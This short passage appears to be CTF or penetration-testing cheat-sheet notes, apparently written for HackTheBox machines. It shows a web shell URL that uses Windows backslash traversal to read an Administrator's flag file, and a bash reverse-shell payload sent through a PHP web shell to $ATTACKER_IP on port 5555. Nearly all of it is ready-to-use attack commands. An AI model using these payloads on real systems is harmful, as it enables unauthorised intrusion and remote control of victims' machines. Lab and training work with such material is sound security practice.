
In Windows, certain path traversal methods like `cd ../../` may not work in `cmd.exe`, especially when used through web shells or remote command execution.

✅ Instead of using Unix-style paths, use **Windows-style backslashes (`\`)** for directory traversal.

```
http://$VICTIM_IP/rev.php?cmd=cmd.exe%20/c%20more%20..\..\Users\Administrator\Desktop\flag.txt
```



### <span style="color:#50FA7B">Getting reverse shell from web shell payload (Php)</span>
```bash
# payload
bash -c 'bash -i >%26 /dev/tcp/$ATTACKER_IP/5555 0>%261'

#example URL 
<http://admin.usage.htb/uploads/images/shell.php?c=bash > -c 'bash -i >%26 /dev/tcp/$ATTACKER_IP/5555 0>%261'
```